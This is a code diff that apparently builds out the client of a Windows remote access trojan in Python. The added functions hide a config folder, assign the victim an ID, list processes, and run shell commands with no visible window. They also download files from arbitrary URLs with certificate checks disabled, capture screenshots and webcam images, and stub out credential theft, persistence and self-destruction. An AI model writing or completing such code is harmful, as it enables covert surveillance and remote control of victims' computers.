@@ -1,7 +1,11 @@
 
 import subprocess as sp
+from cv2 import VideoCapture, imwrite
 from urllib.request import urlopen
+import pyautogui
+import requests
 import platform
+import random
 import json
 import ctypes
 import re
@@ -32,13 +36,12 @@ def isVM():
 
 
 def isAdmin():
-    """try:
+    try:
         is_admin = (os.getuid() == 0)
     except AttributeError:
-        is_admin = ctypes.windll.shell32.IsUserAdmin() != 0
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     except Exception:
-        is_admin = False"""
-    is_admin = False
+        is_admin = False
     return is_admin
 
 
@@ -93,31 +96,91 @@ def getHostname():
 
 
 def createConfig():
-    pass
+    try:
+        path = fr'"C:\Users\{getUsername()}\.config"'
+        new_path = path[1:-1]
+        os.mkdir(new_path)
+        os.system(f"attrib +h {path}")
+        path = new_path + fr"\uploads"
+        os.mkdir(path)
+        return True
+    
+    except WindowsError as e:
+        if e.winerror == 183:
+            return False
 
 
 def id():
-    pass
+    path = fr"C:\Users\{getUsername()}\.config\ID"
+    
+    def createID(file):
+        ID = file.read()
+        if ID == "":
+            ID = random.randint(1, 10000)
+            file.write(str(ID))
+        return ID
+    try:    
+        with open(path, "r+") as IDfile:
+            return createID(IDfile)
+
+    except Exception:
+        with open(path, "w+") as IDfile:
+            return createID(IDfile)
 
 
 def cd(path):
-    pass
+    try:
+        os.chdir(fr"{path}")
+        return True
+    except Exception as e:
+        return e
 
 
 def process():
-    pass
+    result = sp.Popen(
+        "tasklist",
+        stderr = sp.PIPE,
+        stdin = sp.DEVNULL,
+        stdout = sp.PIPE,
+        shell = True,
+        text = True,
+        creationflags = 0x08000000
+    )
+    out, err = result.communicate()
+    result.wait()
+    return out
 
 
 def upload(url, name):
-    pass
+    path = fr'C:\Users\{getUsername()}\.config\uploads'\
+    
+    try:
+        r = requests.get(url, allow_redirects = True, verify = False)
+        open(fr"{path}\{name}", "wb").write(r.content)
+        return True
+    
+    except Exception as e:
+        return e
 
 
 def screenshot():
-    pass
+    try:
+        Screenshot = pyautogui.screenshot()
+        path = os.environ["temp"] + "\\s.png"
+        Screenshot.save(path)
+    except Exception as e:
+        return False
 
 
 def webshot():
-    pass
+    try:
+        cam = VideoCapture(0)
+        ret, frame = cam.read()
+        path = os.environ["temp"] + "\\p.png"
+        imwrite(path, frame)
+        return path
+    except Exception as e:
+        return False
 
 
 def creds():
@@ -128,8 +191,22 @@ def persistent():
     pass
 
 
-def cmd(command):
-    pass
+def cmd(command:str):
+    result = sp.Popen(
+        command.split(),
+        stderr = sp.PIPE,
+        stdin = sp.DEVNULL,
+        stdout = sp.PIPE,
+        shell = True,
+        text = True,
+        creationflags = 0x08000000
+    )
+    out, err = result.communicate()
+    result.wait()
+    if not err:
+        return out
+    else:
+        return err
 
 
 def selfdestruct():
